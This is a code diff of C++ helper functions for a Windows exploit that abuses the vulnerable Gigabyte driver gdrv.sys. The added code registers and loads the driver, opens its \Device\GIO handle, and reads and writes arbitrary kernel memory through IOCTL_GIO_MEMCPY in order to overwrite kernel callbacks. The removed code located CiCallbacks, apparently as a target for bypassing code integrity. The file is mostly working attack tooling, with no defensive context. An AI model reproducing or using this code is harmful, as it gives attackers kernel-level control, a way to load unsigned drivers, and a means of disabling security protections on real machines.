@@ -1,63 +1,7 @@
 #include "includes.h"
 #include <DbgHelp.h>
+#include "ntdll.h"
 
-DWORD64 helpers::find_pattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, const char* mask, size_t offsetAfterMatch = 0 ) {
-    size_t patternSize = strlen( mask );
-
-    for ( size_t i = 0; i <= imageSize - patternSize; ++i ) {
-        bool found = true;
-
-        for ( size_t j = 0; j < patternSize; ++j ) {
-            unsigned char currentByte = *( unsigned char* )( imageBase + i + j );
-
-            if ( mask[j] != '?' && pattern[j] != currentByte ) {
-                found = false;
-                break;
-            }
-        }
-
-        if ( found ) {
-            DWORD64 matchAddr = imageBase + i + offsetAfterMatch;
-            std::printf( "[+] Pattern match at: 0x%llx (offset +%llx)\n", matchAddr, offsetAfterMatch );
-            return matchAddr;
-        }
-    }
-
-    std::printf( "[-] Pattern not found.\n" );
-    return 0;
-}
-
-uintptr_t helpers::find_pattern2( uint8_t* base, size_t size, const uint8_t* pattern, const char* mask ) {
-    size_t pattern_len = strlen( mask );
-
-    for ( size_t i = 0; i <= size - pattern_len; ++i ) {
-        bool found = true;
-        for ( size_t j = 0; j < pattern_len; ++j ) {
-            if ( mask[j] != '?' && pattern[j] != base[i + j] ) {
-                found = false;
-                break;
-            }
-        }
-        if ( found ) return ( uintptr_t )&base[i];
-    }
-    std::printf( "[-] Pattern not found.\n" );
-    return 0;
-}
-
-uintptr_t helpers::resolve_lea_target( uintptr_t instr_addr ) {
-    int32_t rel_offset = *( int32_t* )( instr_addr + 3 );
-    return instr_addr + 7 + rel_offset; // lea instruction is 7 bytes
-}
-
-bool helpers::CompareByte( const PUCHAR data, const PUCHAR pattern, UINT32 len )
-{
-    for ( auto i = 0; i < len; i++ )
-    {
-        if ( data[i] != pattern[i] && pattern[i] != 0 )
-            return false;
-    }
-    return true;
-}
 
 bool helpers::CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr ) {
     while ( *ansiStr && *wideStr ) {
@@ -67,7 +11,6 @@ bool helpers::CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr ) {
     }
     return *ansiStr == 0 && *wideStr == 0;
 }
-
 
 uintptr_t helpers::GetProcAddress( void* hModule, const wchar_t* wAPIName )
 {
@@ -102,49 +45,180 @@ uintptr_t helpers::GetProcAddress( void* hModule, const wchar_t* wAPIName )
 }
 
 
-std::vector<helpers::PatternMatch> helpers::find_lea_rax_patterns(
-    DWORD64 imageBase,
-    size_t imageSize,
-    const unsigned char* pattern,
-    const char* mask,
-    size_t offsetAfterMatch
-) {
-    std::vector<PatternMatch> matches;
-    size_t patternLength = strlen( mask );
-
-    for ( size_t i = 0; i <= imageSize - patternLength; ++i ) {
+bool helpers::find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress ){
+    for ( size_t i = 0; i < scanSize - patternSize; i++ ) {
         bool match = true;
+        for ( size_t j = 0; j < patternSize; j++ ) {
 
-        for ( size_t j = 0; j < patternLength; ++j ) {
-            if ( mask[j] != '?' && pattern[j] != *( unsigned char* )( imageBase + i + j ) ) {
+            if ( j >= 9 && j <= 12 )
+                continue;
+
+            if ( base[i + j] != pattern[j] ) {
                 match = false;
                 break;
             }
         }
 
-        if ( !match ) continue;
         if ( match ) {
-            DWORD64 instrAddr = imageBase + i + 4; // LEA is likely at offset +4
-            DWORD32 leaOffset = *( DWORD32* )( instrAddr + 3 );
-
-            // Prevent 64-bit overflow by splitting logic
-            DWORD32 instrLow = ( DWORD32 )instrAddr;
-            DWORD32 addrLow = instrLow + 3 + 4 + leaOffset;
-            DWORD64 targetAddr = ( instrAddr & 0xFFFFFFFF00000000 ) + addrLow;
-
-            std::printf( "[*] usermode CiCallbacks : %p\n", ( void* )targetAddr );
-            DWORD64 offsetInImage = targetAddr - imageBase;
-            std::printf( "[*] Offset  : %p\n", ( void* )offsetInImage );
-
-            // Convert usermode offset to kernel address
-            DWORD64 kernelAddress = globals::nt_base + offsetInImage;
-            std::printf( "[*] Kernel CiCallbacks : %p\n", ( void* )kernelAddress );
+            outAddress = reinterpret_cast< uint64_t >( base + i );
+            return true;
         }
     }
 
-    if ( matches.empty() ) {
-        std::printf( "[-] No pattern matches found.\n" );
+    return false;
+}
+
+void helpers::DeleteService( PWCHAR ServiceName )
+{
+    // TODO: drv side
+    SHDeleteKeyW( HKEY_LOCAL_MACHINE, ServiceName + sizeof( NT_MACHINE ) / sizeof( WCHAR ) - 1 );
+}
+
+uint64_t helpers::ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize ) {
+    int32_t relOffset = *reinterpret_cast< int32_t* >( instrAddress + offsetOffset );
+    return instrAddress + offsetOffset + sizeof( int32_t ) + relOffset;
+}
+
+NTSTATUS helpers::ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue ) {
+    GIOMemcpyInput MemcpyInput{};
+    IO_STATUS_BLOCK IoStatusBlock{};
+
+    MemcpyInput.Src = { target };
+    MemcpyInput.Dst = reinterpret_cast< ULONG64 >( &outValue );
+    MemcpyInput.Size = sizeof( outValue );
+    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
+
+    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
+        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
+}
+
+NTSTATUS helpers::WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
+    GIOMemcpyInput MemcpyInput{};
+    IO_STATUS_BLOCK IoStatusBlock{};
+
+    MemcpyInput.Src = reinterpret_cast< ULONG64 >( &value );
+    MemcpyInput.Dst = { target };
+    MemcpyInput.Size = sizeof( value );
+    RtlZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
+
+    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
+        &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
+}
+
+NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName ) {
+    *outHandle = nullptr;
+
+    // Try to open first (driver might already be loaded)
+    NTSTATUS stat = helpers::OpenDeviceHandle( outHandle, FALSE );
+
+    if ( NT_SUCCESS( stat ) && *outHandle ) {
+        wprintf( L"[*] Device handle opened successfully (preloaded): %p\n", *outHandle );
+        return stat;
     }
 
-    return matches;
+    // Try to load the driver
+    stat = helpers::LoadDriver( LoaderServiceName );
+    if ( !NT_SUCCESS( stat ) ) return stat;
+
+    wprintf( L"[+] Vuln (gdrv.sys) loaded successfully\n" );
+
+    std::this_thread::sleep_for( std::chrono::milliseconds( 200 ) );
+
+    // Try to open device again after loading
+    stat = helpers::OpenDeviceHandle( outHandle, 0 );
+    if ( !NT_SUCCESS( stat ) || !*outHandle ) return stat;
+
+    wprintf( L"[*] Device handle opened successfully: %p\n", *outHandle );
+    return stat;
+}
+
+NTSTATUS helpers::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors )
+{
+    UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\GIO" );
+    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
+    IO_STATUS_BLOCK IoStatusBlock{};
+
+    const NTSTATUS stat = NtCreateFile( DeviceHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, nullptr,
+        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, nullptr, 0 );
+
+    if ( !NT_SUCCESS( stat ) && PrintErrors ) return stat;
+
+    return stat;
+}
+
+NTSTATUS helpers::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
+{
+    helpers::FileNameToServiceName( ServiceName, FileName );
+    NTSTATUS Status = RtlCreateRegistryKey( RTL_REGISTRY_ABSOLUTE, ServiceName );
+
+    if ( !NT_SUCCESS( Status ) )    return Status;
+
+    WCHAR NtPath[MAX_PATH]{};
+    ULONG ServiceType = SERVICE_KERNEL_DRIVER;
+
+    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"ImagePath", REG_SZ, NtPath, helpers::ConvertToNtPath( NtPath, FileName ) );
+
+    if ( !NT_SUCCESS( Status ) )    return Status;
+
+    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof( ServiceType ) );
+
+    std::wprintf( L"[*] Service Created for %ws\n", FileName );
+    return Status;
+}
+
+int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) {
+    if ( !Dst || !Src ) return 0;
+
+    constexpr const wchar_t* NtPrefix = { L"\\??\\" };
+    constexpr size_t PrefixLen = 4;
+
+    size_t srcLen = wcslen( Src );
+    size_t totalLen = PrefixLen + srcLen;
+
+    if ( totalLen >= MAX_PATH ) return 0;
+
+    // fk it - manual copying
+    Dst[0] = L'\\';
+    Dst[1] = L'?';
+    Dst[2] = L'?';
+    Dst[3] = L'\\';
+
+    for ( size_t i = 0; i <= srcLen; ++i ) Dst[PrefixLen + i] = Src[i];
+
+    return static_cast< int >( ( totalLen + 1 ) * sizeof( wchar_t ) );
+}
+
+NTSTATUS helpers::LoadDriver( PWCHAR ServiceName )
+{
+    UNICODE_STRING ServiceNameUcs;
+    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
+    return NtLoadDriver( &ServiceNameUcs );
+}
+
+NTSTATUS helpers::UnloadDriver( PWCHAR ServiceName )
+{
+    UNICODE_STRING ServiceNameUcs;
+    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
+    return NtUnloadDriver( &ServiceNameUcs );
+}
+
+void helpers::FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName ) {
+    std::wstring fullPath( FileName );
+
+    auto filename = [&]() -> std::wstring {
+        size_t lastSlash = fullPath.find_last_of( L"\\/" );
+        return ( lastSlash != std::wstring::npos )
+            ? fullPath.substr( lastSlash + 1 )
+            : fullPath;
+    }( );
+
+    auto servicePart = [&]() -> std::wstring {
+        size_t dot = filename.find( L'.' );
+        return filename.substr( 0, dot );
+    }( );
+
+    std::wstring final = std::wstring( SVC_BASE ) + std::wstring( servicePart );
+
+    std::wmemcpy( ServiceName, final.data(), final.size() );
+    ServiceName[final.size()] = L'\0';
 }
